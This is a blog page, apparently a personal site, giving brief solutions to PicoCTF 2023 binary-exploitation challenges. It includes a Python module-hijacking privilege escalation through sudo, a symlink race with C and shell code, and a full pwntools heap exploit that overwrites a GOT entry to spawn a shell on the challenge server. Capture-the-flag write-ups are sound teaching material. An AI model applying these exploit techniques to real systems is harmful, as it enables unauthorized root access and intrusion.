@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  
+    <link rel="alternate" hreflang="zh" href="/zh/2023/03/30/picoctf2023/">
+  
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/">Home</a>
+				<a href="/archives">Archive</a>
+				
+					<a href="/categories">Categories</a>
+				
+				
+					<a href="/tags">Tags</a>
+				
+				<a href="/zh">中文站</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+      <nav class="lang-switch" role="navigation" aria-label="Language switch">
+        
+          <a class="lang-pill"
+             href="/zh/2023/03/30/picoctf2023/"
+             hreflang="zh">
+            <span class="lang-label">中文</span>
+          </a>
+        
+      </nav>
+    
+
+	<h1>PicoCTF 2023 pwn wp</h1>
+	<p>Simple yet still engaging.</p>
+<span id="more"></span>
+<h2 id="PicoCTF-2023-Pwn-Writeup">PicoCTF 2023 Pwn Writeup</h2>
+<h3 id="challenge-babygame01-status-SOLVED-working-T1d">challenge babygame01| status: SOLVED | working: T1d</h3>
+<p>Move to position (-1, 86), and the flag count will be overwritten to 64. Simply input <code>p</code> to obtain the flag.</p>
+<h3 id="challenge-two-sum-status-SOLVED-issue-T1d">challenge two-sum | status: SOLVED | issue: T1d</h3>
+<p><code>2^31-1</code> and <code>1</code>, integer overflow</p>
+<h3 id="Challenge-VNE-Status-SOLVED-Workflow-T1d">Challenge VNE | Status: SOLVED | Workflow: T1d</h3>
+<p>According to the prompt, add environment variables and execute the ls command as root. The first execution of '<code>ls /root</code>' allows you to see the 'flag.txt' file.</p>
+<p>The second execution uses the '&amp;&amp;' symbol to run '<code>ls /root &amp;&amp; cat /root/flag.txt</code>' to retrieve the flag.</p>
+<h3 id="Challenge-Hijacking-Status-SOLVED-Work-T1d">Challenge Hijacking | Status: SOLVED | Work: T1d</h3>
+<p>Using the <code>sudo -l</code> command, it was discovered that the <code>.server.py</code> file can be executed with root privileges without a password. Upon inspecting the file, it was found that the <code>base64</code> module is imported. A new <code>base64.py</code> file was created in the same directory with the content: <code>import os;os.system('ls -a /root')</code>. Then, by running <code>sudo /usr/bin/python3 /home/picoctf/.server.py</code>, the contents of the root directory were printed, including the <code>.flag.txt</code> file. Subsequently, the <code>base64.py</code> file was modified to <code>import os;os.system('cat /root/.flag.txt')</code>, and executing <code>.server.py</code> again successfully retrieved the flag.</p>
+<h3 id="challenge-tic-tac-status-SOLVED-author-junyu33">challenge tic-tac | status: SOLVED | author: junyu33</h3>
+<p>Ref: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use</a></p>
+<pre><code class="language-C++">// vuln.cpp
+#include &lt;iostream&gt;
+#include &lt;fstream&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+
+int main(int argc, char *argv[]) &#123;
+        while(1) &#123;
+                symlink(&quot;flag.txt&quot;, &quot;test&quot;);
+                unlink(&quot;test&quot;);
+                symlink(&quot;dummy&quot;, &quot;test&quot;);
+                unlink(&quot;test&quot;);
+        &#125;
+        return 0;
+&#125;
+</code></pre>
+<pre><code class="language-sh">#!/bin/sh
+# test.sh
+while true
+do
+    ./txtreader test
+done
+</code></pre>
+<pre><code class="language-sh">g++ vuln.cpp -o vuln
+nice -20 ./vuln
+nice -n 20 ./test.sh
+</code></pre>
+<h3 id="challenge-babygame02-status-SOLVED-worked-by-junyu33">challenge babygame02 | status: SOLVED | worked by: junyu33</h3>
+<p>Move to position (-1, 51) and replace the tile with <code>\x7c</code> to obtain the flag.</p>
+<h3 id="Challenge-Horsetrack-Status-SOLVED-Working-T1d">Challenge Horsetrack | Status: SOLVED | Working: T1d</h3>
+<p>The check reveals that <code>PIE</code> protection is not enabled. The program includes functions to create, delete, and print heap chunks, but printing requires having more than four heap chunks. Additionally, the program does not clear pointers during deletion, and there is a hidden function that allows modifying heaps stored in the heap manager, indicating a UAF vulnerability. Therefore, the solution involves first leaking the XOR encryption key used by tcache, then using the hidden function to add the <code>free</code> function's GOT entry to tcache, and finally modifying the <code>free</code> function's GOT entry to point to <code>system</code>.</p>
+<pre><code class="language-Python">from pwn import *
+
+# p = process('./vuln')
+p = remote('saturn.picoctf.net', 63361)
+elf = ELF('./vuln')
+lib = ELF('./libc.so.6')
+
+
+def choice(id_):
+    p.recvuntil(b'Choice:')
+    p.sendline(id_)
+
+
+def change(id_, mess, spot):
+    choice(b'0')
+    p.recvuntil(b'Stable index # (0-17)?')
+    p.sendline(id_)
+    p.recvuntil(b'characters:')
+    p.sendline(mess)
+    p.recvuntil(b'New spot?')
+    p.sendline(spot)
+
+
+def add(id_, size_, mess):
+    choice(b'1')
+    p.recvuntil(b'Stable index # (0-17)?')
+    p.sendline(id_)
+    p.recvuntil(b'Horse name length (16-256)?')
+    p.sendline(size_)
+    p.recvuntil(b'characters:')
+    p.sendline(mess)
+
+
+def delete(id_):
+    choice(b'2')
+    p.recvuntil(b'Stable index # (0-17)?')
+    p.sendline(id_)
+
+
+[add(str(i), b'23', b'a' * 23) for i in range(0, 5)]
+delete(b'0')
+add(b'17', b'23', b'\xff')
+
+choice(b'3')
+p.recvuntil(b'WINNER: ')
+key = u16(p.recv(2))
+print(hex(key))
+
+add(b'14', b'24', b'a' * 31)
+add(b'15', b'24', b'a' * 31)
+delete(b'14')
+delete(b'15')
+
+free_got = elf.got['free'] - 0x18
+payload = p64(free_got ^ key) + p64(0)
+change(b'15', payload, b'16')
+
+payload = b'/bin/sh\00' + b'\xff'
+add(b'14', b'24', payload)
+payload = p64(0) * 3 + p64(elf.sym['system'])
+add(b'15', b'31', payload)
+delete(b'14')
+
+p.interactive()
+</code></pre>
+
+</div>
+
+
+  </div>
+</body>
+</html>
+
